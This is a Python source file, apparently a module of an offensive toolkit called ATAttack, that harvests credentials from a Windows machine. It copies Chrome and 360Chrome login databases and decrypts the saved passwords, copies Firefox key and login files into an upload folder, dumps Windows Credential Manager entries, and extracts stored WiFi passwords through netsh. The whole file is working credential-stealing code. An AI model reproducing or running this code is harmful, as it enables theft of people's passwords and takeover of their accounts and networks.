#! /usr/bin/env python2.7
# -*- coding: utf-8 -*-

import sqlite3
import win32crypt
import configparser
import shutil
import win32cred
import random,string
import os
import re
from ATAttack.framework.constant import constant
from ATAttack.framework.prints import print_success


import tempfile

tmp = tempfile.gettempdir()


class decypt():

    def __init__(self):
        self.database_query = 'SELECT action_url, username_value, password_value FROM logins'

    def str_rangdom(self):
        return ''.join(random.sample(string.ascii_letters + string.digits,8))

    def copy_db(self,db_path,database_path):

        if os.path.isfile(db_path):
            shutil.copy(db_path, database_path)
        return database_path

    def clean_file(self, db_path):
        try:
            os.popen('RD /S /Q ' + db_path)
        except Exception:
            return False

    def get_decypt_chrome(self):

        db_path = os.path.join(
            constant.profile['LOCALAPPDATA'],u'Google\Chrome\\User Data\Default\Login Data')
        databases = self.copy_db(db_path,tmp + os.sep + self.str_rangdom())
        conn = sqlite3.connect(databases)
        cursor = conn.cursor()
        cursor.execute(self.database_query)
        try:
            for url, login, password in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                if password:
                    print "Chrome browser decryption result: "
                    print 'Title: ' + url
                    print 'Username: ' + login
                    print 'Password: ' + password
        except Exception:
            return False
        finally:
            conn.close()
            os.remove(databases)

    def get_decypt_360chrome(self):

        file_path = os.path.join(
            constant.profile['LOCALAPPDATA'],r'360Chrome\Chrome\User Data\Default\Login Data')
        databases = self.copy_db(file_path,tmp + os.sep + self.str_rangdom())
        conn = sqlite3.connect(databases)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        try:
            for result in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(
                    result[2], None, None, None, 0)[1]
                if password:
                    print "360 browser decryption result: "
                    print 'Title: ' + result[0]
                    print 'Username: ' + result[1]
                    print 'Password: ' + password
        except Exception:
            pass
        finally:
            conn.close()
            os.remove(databases)

    def get_firefox_profiles(self):

        iniPath = os.path.join(constant.profile['APPDATA'],
                               r'Mozilla\Firefox\profiles.ini')
        config = configparser.ConfigParser()
        config.read(iniPath)
        return os.path.join(
            constant.profile['APPDATA'],r'Mozilla\Firefox',config['Profile0']['Path'] + '\\') .replace("/", "\\")

    def send_firefox_data(self):

        key = ['key4.db', 'key3.db', 'logins.json']
        for db in key:
            filename = self.get_firefox_profiles() + db
            if os.path.isfile(filename):
                shutil.copy(filename, constant.upload_dir)


    def ie_decrypt(self):

        CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
        CredRead = win32cred.CredRead
        try:
            creds = win32cred.CredEnumerate(None, 0)  # Enumerate credentials
            credentials = []
            for package in creds:
                target = package['TargetName']
                creds = CredRead(target, CRED_TYPE_GENERIC)
                credentials.append(creds)
            values = {}
            for cred in credentials:
                values['service'] = cred['TargetName']
                values['UserName'] = cred['UserName']
                values['pwd'] = cred['CredentialBlob'].decode('utf16')
            print values
        except Exception:
            pass

    def decrypt_using_netsh(self):
        print_success("Attempt to get system WiFi password")
        try:
            values = []
            process = os.popen('netsh wlan show profiles').read()
            wifi_name = re.findall(':\s+.+', str(process))
            for wifi in wifi_name:
                wifi_ = wifi.replace(': ', '')
                key = os.popen('netsh wlan show profiles "{}" key=clear'.format(wifi_)).read()
                _password = re.findall('(?<=Key Content\s\s\s\s\s\s\s\s\s\s\s\s:)[\s\S]*(?=\n\nCost)', str(key))
                if _password:
                    _wifi = 'SSID' + ":" + str(wifi_) + "|" + "PAssword" + ":" + str(_password)
                    values.append(_wifi)
            print values
        except Exception:
            pass


